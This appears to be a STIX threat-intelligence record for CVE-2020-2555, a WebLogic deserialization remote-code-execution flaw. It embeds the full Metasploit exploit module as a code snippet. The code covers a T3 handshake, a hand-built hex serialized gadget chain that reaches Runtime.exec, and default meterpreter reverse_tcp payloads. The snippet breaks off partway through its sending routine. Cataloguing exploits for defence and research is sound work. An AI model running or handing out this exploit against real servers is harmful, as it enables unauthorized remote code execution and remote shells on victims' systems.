{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6337f7f5-8229-42d3-9b27-736d7f22deea",
    "created": "2024-08-14T17:06:50.530093Z",
    "modified": "2024-08-14T17:06:50.530097Z",
    "name": "WebLogic Server Deserialization RCE - BadAttributeValueExpException",
    "description": " There exists a Java object deserialization vulnerability in multiple versions of WebLogic.  Unauthenticated remote code execution can be achieved by sending a serialized BadAttributeValueExpException object over the T3 protocol to vulnerable WebLogic servers.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/weblogic_deserialize_badattrval.rb",
            "external_id": "weblogic_deserialize_badattrval.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-2555"
        },
        {
            "source_name": "reference",
            "url": "https://www.thezdi.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Y4er/CVE-2020-2555"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Powershell\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'WebLogic Server Deserialization RCE - BadAttributeValueExpException',\n        'Description' => %q{\n          There exists a Java object deserialization vulnerability\n          in multiple versions of WebLogic.\n\n          Unauthenticated remote code execution can be achieved\n          by sending a serialized BadAttributeValueExpException object\n          over the T3 protocol to vulnerable WebLogic servers.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Jang', # Vuln Discovery\n          'Y4er', # PoC\n          'Shelby Pace', # Metasploit Module\n          'Steve Embling' # T3S support\n        ],\n        'References' => [\n          [ 'CVE', '2020-2555' ],\n          [ 'URL', 'https://www.thezdi.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server' ],\n          [ 'URL', 'https://github.com/Y4er/CVE-2020-2555' ]\n        ],\n        'Platform' => %w[unix linux win],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Windows',\n            {\n              'Platform' => 'win',\n              'Arch' => [ ARCH_X86, ARCH_X64 ],\n              'DefaultOptions' => { 'Payload' => 'windows/meterpreter/reverse_tcp' }\n            }\n          ],\n          [\n            'Unix',\n            {\n              'Platform' => %w[unix linux],\n              'CmdStagerFlavor' => 'printf',\n              'Arch' => [ ARCH_X86, ARCH_X64 ],\n              'DefaultOptions' => { 'Payload' => 'linux/x86/meterpreter/reverse_tcp' }\n            }\n          ],\n        ],\n        'DisclosureDate' => '2020-01-15',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Reliability' => [REPEATABLE_SESSION],\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(7001),\n    ])\n\n    register_advanced_options([\n      OptBool.new('FORCE_T3', [false, 'Force T3 protocol even over SSL', false])\n    ])\n  end\n\n  def check\n    connect\n\n    web_req = \"GET /console/login/LoginForm.jsp HTTP/1.1\\nHost: #{peer}\\n\\n\"\n    sock.put(web_req)\n    sleep(2)\n    res = sock.get_once\n\n    versions = [ Rex::Version.new('12.1.3.0.0'), Rex::Version.new('12.2.1.3.0'), Rex::Version.new('12.2.1.4.0') ]\n\n    return CheckCode::Unknown('Failed to obtain response from service') unless res\n\n    /WebLogic\\s+Server\\s+Version:\\s+(?<version>\\d+\\.\\d+\\.\\d+\\.*\\d*\\.*\\d*)/ =~ res\n    return CheckCode::Unknown('Failed to detect WebLogic') unless version\n\n    @version_no = Rex::Version.new(version)\n    print_status(\"WebLogic version detected: #{@version_no}\")\n\n    return CheckCode::Appears if versions.include?(@version_no)\n\n    CheckCode::Detected('Version of WebLogic is not vulnerable')\n  ensure\n    disconnect\n  end\n\n  def exploit\n    connect\n    print_status('Sending handshake...')\n    t3_handshake\n\n    if target.name == 'Windows'\n      win_obj = cmd_psh_payload(payload.encoded, payload_instance.arch.first, { remove_comspec: true })\n      win_obj.prepend('cmd.exe /c ')\n      win_obj = build_payload_obj(win_obj)\n      t3_send(win_obj)\n    else\n      execute_cmdstager\n    end\n  ensure\n    disconnect\n  end\n\n  def t3_handshake\n    # t3 12.2.1\\nAS:255\n    # \\nHL:19\\nMS:100000\n    # 00\\n\\n\n    if !datastore['SSL'] || datastore['FORCE_T3']\n      shake = '7433'\n    else\n      shake = '743373'\n    end\n    shake << '2031322e322e310a41533a323535'\n    shake << '0a484c3a31390a4d533a313030303030'\n    shake << '30300a0a'\n\n    sock.put([shake].pack('H*'))\n    sleep(1)\n    sock.get_once\n  end\n\n  # rubocop:disable Metrics/MethodLength\n  def build_payload_obj(payload_data)\n    payload_obj = 'aced' # STREAM_MAGIC\n    payload_obj << '0005' # STREAM_VERSION\n    payload_obj << '7372' # TC_OBJECT, TC_CLASSDESC\n    payload_obj << '002e' # Class name length: 46\n    payload_obj << '6a617661782e6d616e61' # Class name: javax.management.BadAttributeValueExpException\n    payload_obj << '67656d656e742e426164'\n    payload_obj << '41747472696275746556'\n    payload_obj << '616c7565457870457863'\n    payload_obj << '657074696f6e'\n    payload_obj << 'd4e7daab632d4640' # SerialVersionUID\n    payload_obj << '020001' # Serialization flag, field num = 1\n    payload_obj << '4c0003' # Field type code: 4c = Object, field name length: 3\n    payload_obj << '76616c' # Field name: val\n    payload_obj << '740012' # String, length: 18\n    payload_obj << '4c6a6176612f6c616e672f4f626a6563743b' # Ljava/lang/Object;\n    payload_obj << '7872' # end block data, TC_CLASSDESC\n    payload_obj << '0013' # Class name length: 19\n    payload_obj << '6a6176612e6c616e672e' # java.lang.Exception\n    payload_obj << '457863657074696f6e'\n    payload_obj << 'd0fd1f3e1a3b1cc4' # SerialVersionUID\n    payload_obj << '020000' # Serializable, No fields\n    payload_obj << '7872' # end block data, TC_CLASSDESC\n    payload_obj << '0013' # Class name length: 19\n    payload_obj << '6a6176612e6c616e672e' # java.lang.Throwable\n    payload_obj << '5468726f7761626c65'\n    payload_obj << 'd5c635273977b8cb' # SerialVersionUID\n    payload_obj << '030004' # ?, then 4 fields\n    payload_obj << '4c0005' # Field type: Object, field name length: 5\n    payload_obj << '6361757365' # Field name: cause\n    payload_obj << '740015' # String, length: 21\n    payload_obj << '4c6a6176612f6c616e67' # Ljava/lang/Throwable;\n    payload_obj << '2f5468726f7761626c653b'\n    payload_obj << '4c000d' # Field type: Object, field name length: 13\n    payload_obj << '64657461696c4d657373616765' # Field name: detailMessage\n    payload_obj << '740012' # String, length: 18\n    payload_obj << '4c6a6176612f6c616e67' # Ljava/lang/String;\n    payload_obj << '2f537472696e673b'\n    payload_obj << '5b000a' # Field type: 5b = array, field name length: 10\n    payload_obj << '737461636b5472616365' # Field name: stackTrace\n    payload_obj << '74001e' # String, length: 30\n    payload_obj << '5b4c6a6176612f6c616e' # [Ljava/lang/StackTraceElement;\n    payload_obj << '672f537461636b547261'\n    payload_obj << '6365456c656d656e743b'\n    payload_obj << '4c0014' # Field type: Object, field name length: 20\n    payload_obj << '73757070726573736564' # Field name: suppressedExceptions\n    payload_obj << '457863657074696f6e73'\n    payload_obj << '740010' # String, length: 16\n    payload_obj << '4c6a6176612f7574696c' # Ljava/util/List;\n    payload_obj << '2f4c6973743b'\n    payload_obj << '7870' # TC_ENDBLOCKDATA, TC_NULL\n    payload_obj << '71' # TC_REFERENCE\n    payload_obj << '007e0008' # handle?\n    payload_obj << '7075' # TC_NULL, TC_ARRAY\n    payload_obj << '72001e' # TC_CLASSDESC, Class name length: 30\n    payload_obj << '5b4c6a6176612e6c616e' # [Ljava.lang.StackTraceElement;\n    payload_obj << '672e537461636b547261'\n    payload_obj << '6365456c656d656e743b'\n    payload_obj << '02462a3c3cfd2239' # SerialVersionUID\n    payload_obj << '020000' # Serializable, No fields\n    payload_obj << '7870' # TC_ENDBLOCKDATA, TC_NULL\n    payload_obj << '00000001'\n    payload_obj << '7372' # TC_OBJECT, TC_CLASSDESC\n    payload_obj << '001b' # Class name length: 27\n    payload_obj << '6a6176612e6c616e672e' # java.lang.StackTraceElement\n    payload_obj << '537461636b5472616365'\n    payload_obj << '456c656d656e74'\n    payload_obj << '6109c59a2636dd85' # SerialVersionUID\n    payload_obj << '020004' # Serializable, 4 fields\n    payload_obj << '49000a' # Field type: 49 = Integer, field name length: 10\n    payload_obj << '6c696e654e756d626572' # lineNumber\n    payload_obj << '4c000e' # Field type: Object, field name length: 14\n    payload_obj << '6465636c6172696e6743'\n    payload_obj << '6c617373' # declaringClass\n    payload_obj << '71' # TC_REFERENCE\n    payload_obj << '007e0005' # handle\n    payload_obj << '4c0008' # Field type: Object, field name length: 8\n    payload_obj << '66696c654e616d65' # fileName\n    payload_obj << '71' # TC_REFERENCE\n    payload_obj << '007e0005' # handle\n    payload_obj << '4c000a' # Field type: Object, field name length: 10\n    payload_obj << '6d6574686f644e616d65' # methodName\n    payload_obj << '71' # TC_REFERENCE\n    payload_obj << '007e0005' # handle\n    payload_obj << '7870' # TC_ENDBLOCKDATA, TC_NULL\n    payload_obj << '00000028'\n\n    class_name = Rex::Text.rand_text_alphanumeric(8..14)\n    formatted_class = class_name.each_byte.map { |b| b.to_s(16).rjust(2, '0') }.join\n\n    payload_obj << '74' # String\n    payload_obj << class_name.length.to_s(16).rjust(4, '0')\n    payload_obj << formatted_class # Originally Weblogic_2555 -> PoC class name\n    payload_obj << '74' # String\n    payload_obj << (class_name.length + 5).to_s(16).rjust(4, '0')\n    payload_obj << formatted_class # Originally Weblogic_2555.java\n    payload_obj << '2e6a617661' # .java\n    payload_obj << '740004' # String, length: 4\n    payload_obj << '6d61696e' # main\n    payload_obj << '7372' # TC_OBJECT, TC_CLASSDESC\n    payload_obj << '0026' # Class name length: 38\n    payload_obj << '6a6176612e7574696c2e' # java.util.Collections$UnmodifiableList\n    payload_obj << '436f6c6c656374696f6e'\n    payload_obj << '7324556e6d6f64696669'\n    payload_obj << '61626c654c697374'\n    payload_obj << 'fc0f2531b5ec8e10' # SerialVersionUID\n    payload_obj << '020001' # Serializable, 1 field\n    payload_obj << '4c0004' # Field type: Object, field name length: 4\n    payload_obj << '6c697374' # list\n    payload_obj << '71' # TC_REFERENCE\n    payload_obj << '007e0007' # handle\n    payload_obj << '7872' # TC_ENDBLOCKDATA, TC_CLASSDESC\n    payload_obj << '002c' # Class name length: 44\n    payload_obj << '6a6176612e7574696c2e' # java.util.Collections$UnmodifiableCollection\n    payload_obj << '436f6c6c656374696f6e'\n    payload_obj << '7324556e6d6f64696669'\n    payload_obj << '61626c65436f6c6c6563'\n    payload_obj << '74696f6e'\n    payload_obj << '19420080cb5ef71e' # SerialVersionUID\n    payload_obj << '020001' # Serializable, 1 field\n    payload_obj << '4c0001' # Field type: Object, field name length: 1\n    payload_obj << '63' # Field name: c\n    payload_obj << '740016' # String, length: 22\n    payload_obj << '4c6a6176612f7574696c' # Ljava/util/Collection;\n    payload_obj << '2f436f6c6c656374696f'\n    payload_obj << '6e3b'\n    payload_obj << '7870' # TC_ENDBLOCKDATA, TC_NULL\n    payload_obj << '7372' # TC_OBJECT, TC_CLASSDESC\n    payload_obj << '0013' # Class name length: 19\n    payload_obj << '6a6176612e7574696c2e' # java.util.ArrayList\n    payload_obj << '41727261794c697374'\n    payload_obj << '7881d21d99c7619d' # SerialVersionUID\n    payload_obj << '030001' # ?, 1 field\n    payload_obj << '490004' # Field type: Integer, field name length: 4\n    payload_obj << '73697a65' # size\n    payload_obj << '7870' # TC_ENDBLOCKDATA, TC_NULL\n    payload_obj << '00000000'\n    payload_obj << '7704' # TC_BLOCKDATA, length: 4\n    payload_obj << '00000000'\n    payload_obj << '7871' # TC_ENDBLOCKDATA, TC_REFERENCE\n    payload_obj << '007e0015' # handle\n    payload_obj << '78' # TC_ENDBLOCKDATA\n    payload_obj << '7372' # TC_OBJECT, TC_CLASSDESC\n    payload_obj << '0024' # Class name length: 36\n    payload_obj << '636f6d2e74616e676f73' # com.tangosol.util.filter.LimitFilter\n    payload_obj << '6f6c2e7574696c2e6669'\n    payload_obj << '6c7465722e4c696d6974'\n    payload_obj << '46696c746572'\n    payload_obj << limit_filter_uid # SerialVersionUID\n    payload_obj << '020006' # Serializable, 6 fields\n    payload_obj << '49000b' # Field type: Integer, field name length: 11\n    payload_obj << '6d5f635061676553697a65' # m_cPageSize\n    payload_obj << '490007' # Field type: Integer, field name length: 7\n    payload_obj << '6d5f6e50616765' # m_nPage\n    payload_obj << '4c000c' # Field type: Object, field name length: 12\n    payload_obj << '6d5f636f6d70617261746f72' # m_comparator\n    payload_obj << '740016' # String, length: 22\n    payload_obj << '4c6a6176612f7574696c' # Ljava/util/Comparator;\n    payload_obj << '2f436f6d70617261746f'\n    payload_obj << '723b'\n    payload_obj << '4c0008' # Field type: Object, field name length: 8\n    payload_obj << '6d5f66696c746572' # m_filter\n    payload_obj << '74001a' # String, length: 26\n    payload_obj << '4c636f6d2f74616e676f' # Lcom/tangosol/util/Filter;\n    payload_obj << '736f6c2f7574696c2f46'\n    payload_obj << '696c7465723b'\n    payload_obj << '4c000f' # Field type: Object, field name length: 15\n    payload_obj << '6d5f6f416e63686f7242' # m_oAnchorBottom\n    payload_obj << '6f74746f6d'\n    payload_obj << '71' # TC_REFERENCE\n    payload_obj << '007e0001' # handle\n    payload_obj << '4c000c' # Field type: Object, field name length: 12\n    payload_obj << '6d5f6f416e63686f72546f70' # m_oAnchorTop\n    payload_obj << '71' # TC_REFERENCE\n    payload_obj << '007e0001' # handle\n\n    unless @version_no == Rex::Version.new('12.1.3.0.0')\n      payload_obj << add_class_desc\n    end\n\n    payload_obj << '7870' # TC_ENDBLOCKDATA, TC_NULL\n    payload_obj << '00000000'\n    payload_obj << '00000000'\n    payload_obj << '7372' # TC_OBJECT, TC_CLASSDESC\n    payload_obj << '002c' # Class name length: 44\n    payload_obj << '636f6d2e74616e676f73' # com.tangosol.util.extractor.ChainedExtractor\n    payload_obj << '6f6c2e7574696c2e6578'\n    payload_obj << '74726163746f722e4368'\n    payload_obj << '61696e65644578747261'\n    payload_obj << '63746f72'\n    payload_obj << chained_extractor_uid # SerialVersionUID\n    payload_obj << '020000' # Serializable, no fields\n    payload_obj << '7872' # TC_ENDBLOCKDATA, TC_CLASSDESC\n    payload_obj << '0036' # Class name length: 54\n    payload_obj << '636f6d2e74616e676f73' # com.tangosol.util.extractor.AbstractCompositeExtractor\n    payload_obj << '6f6c2e7574696c2e6578'\n    payload_obj << '74726163746f722e4162'\n    payload_obj << '737472616374436f6d70'\n    payload_obj << '6f736974654578747261'\n    payload_obj << '63746f72'\n    payload_obj << '086b3d8c05690f44' # SerialVersionUID\n    payload_obj << '020001' # Serializable, 1 field\n    payload_obj << '5b000c' # Field type: Array, field name length: 12\n    payload_obj << '6d5f61457874726163746f72' # m_aExtractor\n    payload_obj << '740023' # String, length: 35\n    payload_obj << '5b4c636f6d2f74616e67' # [Lcom/tangosol/util/ValueExtractor;\n    payload_obj << '6f736f6c2f7574696c2f'\n    payload_obj << '56616c75654578747261'\n    payload_obj << '63746f723b'\n    payload_obj << '7872' # TC_ENDBLOCKDATA, TC_CLASSDESC\n    payload_obj << '002d' # Class name length: 45\n    payload_obj << '636f6d2e74616e676f73' # com.tangosol.util.extractor.AbstractExtractor\n    payload_obj << '6f6c2e7574696c2e6578'\n    payload_obj << '74726163746f722e4162'\n    payload_obj << '73747261637445787472'\n    payload_obj << '6163746f72'\n    payload_obj << abstract_extractor_uid # SerialVersionUID\n    payload_obj << '020001' # Serializable, 1 field\n    payload_obj << '490009' # Field type: Integer, field name length: 9\n    payload_obj << '6d5f6e546172676574' # m_nTarget\n    payload_obj << '7870' # TC_ENDBLOCKDATA, TC_NULL\n    payload_obj << '00000000'\n    payload_obj << '7572' # TC_ARRAY, TC_CLASSDESC\n    payload_obj << '0032' # Class name length: 50\n    payload_obj << '5b4c636f6d2e74616e67' # [Lcom.tangosol.util.extractor.ReflectionExtractor;\n    payload_obj << '6f736f6c2e7574696c2e'\n    payload_obj << '657874726163746f722e'\n    payload_obj << '5265666c656374696f6e'\n    payload_obj << '457874726163746f723b'\n    payload_obj << 'dd8b89aed70273ca' # SerialVersionUID\n    payload_obj << '020000' # Serializable, no fields\n    payload_obj << '7870' # TC_ENDBLOCKDATA, TC_NULL\n    payload_obj << '00000003'\n    payload_obj << '7372' # TC_OBJECT, TC_CLASSDESC\n    payload_obj << '002f' # Class name length: 47\n    payload_obj << '636f6d2e74616e676f73' # com.tangosol.util.extractor.ReflectionExtractor\n    payload_obj << '6f6c2e7574696c2e6578'\n    payload_obj << '74726163746f722e5265'\n    payload_obj << '666c656374696f6e4578'\n    payload_obj << '74726163746f72'\n    payload_obj << reflection_extractor_uid # SerialVersionUID\n    payload_obj << '02000' # Serializable, variable fields orig: 020002\n    payload_obj << reflect_extract_count\n    payload_obj << '5b0009' # Field type: Array, field name length: 9\n    payload_obj << '6d5f616f506172616d' # m_aoParam\n    payload_obj << '740013' # String, length: 19\n    payload_obj << '5b4c6a6176612f6c616e' # [Ljava/lang/Object;\n    payload_obj << '672f4f626a6563743b'\n    payload_obj << add_sect\n    payload_obj << '4c0009' # Object, length: 9\n    payload_obj << '6d5f734d6574686f64' # m_sMethod\n    payload_obj << '71' # TC_REFERENCE\n    payload_obj << '007e0005' # handle\n    payload_obj << '7871' # TC_ENDBLOCKDATA, TC_REFERENCE\n    payload_obj << (change_handle? ? '007e001d' : '007e001e')\n    payload_obj << '00000000'\n    payload_obj << '7572' # TC_ARRAY, TC_CLASSDESC\n    payload_obj << '0013' # Class name length: 19\n    payload_obj << '5b4c6a6176612e6c616e' # [Ljava.lang.Object;\n    payload_obj << '672e4f626a6563743b'\n    payload_obj << '90ce589f1073296c' # SerialVersionUID\n    payload_obj << '020000' # Serializable, no fields\n    payload_obj << '7870' # TC_ENDBLOCKDATA, TC_NULL\n    payload_obj << '00000002'\n    payload_obj << '74000a' # String, length: 10\n    payload_obj << '67657452756e74696d65' # getRuntime\n    payload_obj << '7572' # TC_ARRAY, TC_CLASSDESC\n    payload_obj << '0012' # Class name length: 18\n    payload_obj << '5b4c6a6176612e6c616e' # [Ljava.lang.Class;\n    payload_obj << '672e436c6173733b'\n    payload_obj << 'ab16d7aecbcd5a99' # SerialVersionUID\n    payload_obj << '020000' # Serializable, no fields\n    payload_obj << '7870' # TC_ENDBLOCKDATA, TC_NULL\n    payload_obj << '00000000'\n    payload_obj << add_tc_null\n    payload_obj << '740009' # String, length: 9\n    payload_obj << '6765744d6574686f64' # getMethod\n    payload_obj << '7371' # TC_OBJECT, TC_REFERENCE\n    payload_obj << (change_handle? ? '007e0021' : '007e0022')\n    payload_obj << '00000000'\n    payload_obj << '7571' # TC_ARRAY, TC_REFERENCE\n    payload_obj << (change_handle? ? '007e0024' : '007e0025')\n    payload_obj << '00000002' # array size: 2\n    payload_obj << '7075' # TC_NULL, TC_ARRAY\n    payload_obj << '71' # TC_REFERENCE\n    payload_obj << (change_handle? ? '007e0024' : '007e0025')\n    payload_obj << '00000000'\n    payload_obj << add_tc_null\n    payload_obj << '740006' # TC_STRING, length: 6\n    payload_obj << '696e766f6b65' # invoke\n    payload_obj << '7371' # TC_OBJECT, TC_REFERENCE\n    payload_obj << (change_handle? ? '007e0021' : '007e0022')\n    payload_obj << '00000000'\n    payload_obj << '7571' # TC_ARRAY, TC_REFERENCE\n    payload_obj << (change_handle? ? '007e0024' : '007e0025')\n    payload_obj << '00000001'\n    payload_obj << '7572' # TC_ARRAY, TC_CLASSDESC\n    payload_obj << '0013' # Class name length: 19\n    payload_obj << '5b4c6a6176612e6c616e' # [Ljava.lang.String;\n    payload_obj << '672e537472696e673b'\n    payload_obj << 'add256e7e91d7b47' # SerialVersionUID\n    payload_obj << '020000' # Serializable, no fields\n    payload_obj << '7870' # TC_ENDBLOCKDATA, TC_NULL\n    payload_obj << '00000003'\n\n    payload_bin = format_payload(payload_data)\n    payload_obj << payload_bin\n\n    # Original data\n    # ---------------------------\n    # payload_obj << '740007'                             # String, length: 7\n    # payload_obj << '2f62696e2f7368'                     # /bin/sh\n    # payload_obj << '740002'                             # String, length: 2\n    # payload_obj << '2d63'                               # -c\n    # payload_obj << '740017'                             # String, length: 23\n    # payload_obj << '746f756368202f746d70'               # touch /tmp/blah_ze_blah\n    # payload_obj << '2f626c61685f7a655f62'\n    # payload_obj << '6c6168'\n    # ---------------------------\n    payload_obj << add_tc_null\n\n    payload_obj << '740004' # String, length: 4\n    payload_obj << '65786563' # exec\n    payload_obj << '7070' # TC_NULL, TC_NULL\n    payload_obj << '7672' # TC_CLASS, TC_CLASSDESC\n    payload_obj << '0011' # Class name length: 17\n    payload_obj << '6a6176612e6c616e672e' # java.lang.Runtime\n    payload_obj << '52756e74696d65'\n    payload_obj << '00000000000000000000'\n    payload_obj << '00'\n    payload_obj << '7870' # TC_ENDBLOCKDATA, TC_NULL\n  end\n  # rubocop:enable Metrics/MethodLength\n\n  def change_handle?\n    @version_no == Rex::Version.new('12.1.3.0.0')\n  end\n\n  def limit_filter_uid\n    case @version_no\n    when Rex::Version.new('12.1.3.0.0')\n      '99022596d7b45953'\n    when Rex::Version.new('12.2.1.3.0')\n      'ab2901b976c4e271'\n    else\n      '954e4590be89865f'\n    end\n  end\n\n  def chained_extractor_uid\n    case @version_no\n    when Rex::Version.new('12.1.3.0.0')\n      '889f81b0945d5b7f'\n    when Rex::Version.new('12.2.1.3.0')\n      '06ee10433a4cc4b4'\n    else\n      '435b250b72f63db5'\n    end\n  end\n\n  def abstract_extractor_uid\n    case @version_no\n    when Rex::Version.new('12.1.3.0.0')\n      '658195303e723821'\n    when Rex::Version.new('12.2.1.3.0')\n      '752289ad4d460138'\n    else\n      '9b1be18ed70100e5'\n    end\n  end\n\n  def reflection_extractor_uid\n    case @version_no\n    when Rex::Version.new('12.1.3.0.0')\n      'ee7ae995c02fb4a2'\n    when Rex::Version.new('12.2.1.3.0')\n      '87973791b26429dd'\n    else\n      '1f62f564b951b614'\n    end\n  end\n\n  def reflect_extract_count\n    case @version_no\n    when Rex::Version.new('12.2.1.3.0')\n      '3'\n    else\n      '2'\n    end\n  end\n\n  def add_sect\n    sect = ''\n\n    if @version_no == Rex::Version.new('12.2.1.3.0')\n      sect << '4c0011' # Object, length: 17\n      sect << '6d5f657874726163746f' # m_extractorCached\n      sect << '72436163686564'\n      sect << '71' # TC_REFERENCE\n      sect << '007e0001' # handle\n    end\n\n    sect\n  end\n\n  def add_class_desc\n    class_desc = ''\n    class_desc << '7872' # TC_ENDBLOCKDATA, TC_CLASSDESC\n    class_desc << '0034' # Class name length: 52\n    class_desc << '636f6d2e74616e676f73' # com.tangosol.util.filter.AbstractQueryRecorderFilter\n    class_desc << '6f6c2e7574696c2e6669'\n    class_desc << '6c7465722e4162737472'\n    class_desc << '61637451756572795265'\n    class_desc << '636f7264657246696c74'\n    class_desc << '6572'\n    class_desc << 'f3b98201f680eb90' # SerialVersionUID\n    class_desc << '020000' # Serializable, no fields\n  end\n\n  def add_tc_null\n    return '70' if @version_no == Rex::Version.new('12.2.1.3.0')\n\n    ''\n  end\n\n  def t3_send(payload_obj)\n    print_status('Sending object...')\n\n    request_obj = '000009f3' # Original packet length\n    request_obj << '016501' # CMD_IDENTIFY_REQUEST, flags\n    request_obj << 'ffffffffffffffff'\n    request_obj << '00000071'\n    request_obj << '0000ea60'\n    request_obj << '00000018432ec6'\n    request_obj << 'a2a63985b5af7d63e643'\n    request_obj << '83f42a6d92c9e9af0f94'\n    request_obj << '72027973720078720178'\n    request_obj << '720278700000000c0000'\n    request_obj << '00020000000000000000'\n    request_obj << '00000001007070707070'\n    request_obj << '700000000c0000000200'\n    request_obj << '00000000000000000000'\n    request_obj << '01007006'\n    request_obj << 'fe010000' # separator\n    request_obj << 'aced0005' # STREAM_MAGIC, STREAM_VERSION\n    request_obj << '7372' # TC_OBJECT, TC_CLASSDESC\n    request_obj << '001d' # Class name length: 29\n    request_obj << '7765626c6f6769632e72' # weblogic.rjvm.ClassTableEntry\n    request_obj << '6a766d2e436c61737354'\n    request_obj << '61626c65456e747279'\n    request_obj << '2f52658157f4f9ed' # SerialVersionUID\n    request_obj << '0c0000' # flags?\n    request_obj << '787072' # TC_ENDBLOCKDATA, TC_NULL, TC_CLASSDESC\n    request_obj << '0024' # Class name length: 36\n    request_obj << '7765626c6f6769632e63' # weblogic.common.internal.PackageInfo\n    request_obj << '6f6d6d6f6e2e696e7465'\n    request_obj << '726e616c2e5061636b61'\n    request_obj << '6765496e666f'\n    request_obj << 'e6f723e7b8ae1ec9' # SerialVersionUID\n    request_obj << '020009' # Serializable, 9 fields\n    request_obj << '490005' # Field type: Int, field name length: 5\n    request_obj << '6d616a6f72' # major\n    request_obj << '490005' # Field type: Int, field name length: 5\n    request_obj << '6d696e6f72' # minor\n    request_obj << '49000b' # Field type: Int, field name length: 11\n    request_obj << '70617463685570646174' # patchUpdate\n    request_obj << '65'\n    request_obj << '49000c' # Field type: Int, field name length: 12\n    request_obj << '726f6c6c696e67506174' # rollingPatch\n    request_obj << '6368'\n    request_obj << '49000b' # Field type: Int, field name length: 11\n    request_obj << '73657276696365506163' # servicePack\n    request_obj << '6b'\n    request_obj << '5a000e' # Field type: Z = Bool, field name length: 14\n    request_obj << '74656d706f7261727950' # temporaryPatch\n    request_obj << '61746368'\n    request_obj << '4c0009' # Field type: Object, field name length: 9\n    request_obj << '696d706c5469746c65' # implTitle\n    request_obj << '740012' # String, length: 18\n    request_obj << '4c6a6176612f6c616e67' # Ljava/lang/String;\n    request_obj << '2f537472696e673b'\n    request_obj << '4c000a' # Field type: Object, field name length: 10\n    request_obj << '696d706c56656e646f72' # implVendor\n    request_obj << '71007e0003' # TC_REFERENCE, handle\n    request_obj << '4c000b' # Field type: Object, field name length: 11\n    request_obj << '696d706c56657273696f6e' # implVersion\n    request_obj << '71007e0003' # TC_REFERENCE, handle\n    request_obj << '7870' # TC_ENDBLOCKDATA, TC_NULL\n    request_obj << '7702' # TC_ENDBLOCKDATA\n    request_obj << '000078'\n    request_obj << 'fe010000' # separator\n\n    request_obj << payload_obj\n\n    request_obj << 'fe010000' # separator\n    request_obj << 'aced0005' # STREAM_MAGIC, STREAM_VERSION\n    request_obj << '7372' # TC_OBJECT, TC_CLASSDESC\n    request_obj << '001d' # Class name length: 29\n    request_obj << '7765626c6f6769632e72' # weblogic.rjvm.ClassTableEntry\n    request_obj << '6a766d2e436c61737354'\n    request_obj << '61626c65456e747279'\n    request_obj << '2f52658157f4f9ed' # SerialVersionUID\n    request_obj << '0c0000'\n    request_obj << '787072' # TC_ENDBLOCKDATA, TC_NULL, TC_CLASSDESC\n    request_obj << '0021' # Class name length: 33\n    request_obj << '7765626c6f6769632e63' # weblogic.common.internal.PeerInfo\n    request_obj << '6f6d6d6f6e2e696e7465'\n    request_obj << '726e616c2e5065657249'\n    request_obj << '6e666f'\n    request_obj << '585474f39bc908f1' # SerialVersionUID\n    request_obj << '020007' # Serializable, 7 fields\n    request_obj << '490005' # Field type: Int, field name length: 5\n    request_obj << '6d616a6f72' # major\n    request_obj << '490005' # Field type: Int, field name length: 5\n    request_obj << '6d696e6f72' # minor\n    request_obj << '49000b' # Field type: Int, field name length: 11\n    request_obj << '70617463685570646174' # patchUpdate\n    request_obj << '65'\n    request_obj << '49000c' # Field type: Int, field name length: 12\n    request_obj << '726f6c6c696e67506174' # rollingPatch\n    request_obj << '6368'\n    request_obj << '49000b' # Field type: Int, field name length: 11\n    request_obj << '73657276696365506163' # servicePack\n    request_obj << '6b'\n    request_obj << '5a000e' # Field type: Z = Bool, field name length: 14\n    request_obj << '74656d706f7261727950' # temporaryPatch\n    request_obj << '61746368'\n    request_obj << '5b0008' # Field type: Array, field name length: 8\n    request_obj << '7061636b61676573' # packages\n    request_obj << '740027' # String, length: 39\n    request_obj << '5b4c7765626c6f676963' # [Lweblogic/common/internal/PackageInfo;\n    request_obj << '2f636f6d6d6f6e2f696e'\n    request_obj << '7465726e616c2f506163'\n    request_obj << '6b616765496e666f3b'\n    request_obj << '7872' # TC_ENDBLOCKDATA, TC_CLASSDESC\n    request_obj << '0024' # Class name length: 36\n    request_obj << '7765626c6f6769632e63' # weblogic.common.internal.VersionInfo\n    request_obj << '6f6d6d6f6e2e696e7465'\n    request_obj << '726e616c2e5665727369'\n    request_obj << '6f6e496e666f'\n    request_obj << '972245516452463e' # SerialVersionUID\n    request_obj << '020003' # Serializable, 3 fields\n    request_obj << '5b0008' # Field type: Array, field name length: 8\n    request_obj << '7061636b61676573' # packages\n    request_obj << '71007e0003' # TC_REFERENCE, handle\n    request_obj << '4c000e' # Field type: Object, field name length: 14\n    request_obj << '72656c65617365566572' # releaseVersion\n    request_obj << '73696f6e'\n    request_obj << '740012' # String, length: 18\n    request_obj << '4c6a6176612f6c616e67' # Ljava/lang/String;\n    request_obj << '2f537472696e673b'\n    request_obj << '5b0012' # Field type: Array, field name length: 18\n    request_obj << '76657273696f6e496e66' # versionInfoAsBytes\n    request_obj << '6f41734279746573'\n    request_obj << '740002' # String, length: 2\n    request_obj << '5b42' # [B\n    request_obj << '7872' # TC_ENDBLOCKDATA, TC_CLASSDESC\n    request_obj << '0024' # Class name length: 36\n    request_obj << '7765626c6f6769632e63' # weblogic.common.internal.PackageInfo\n    request_obj << '6f6d6d6f6e2e696e7465'\n    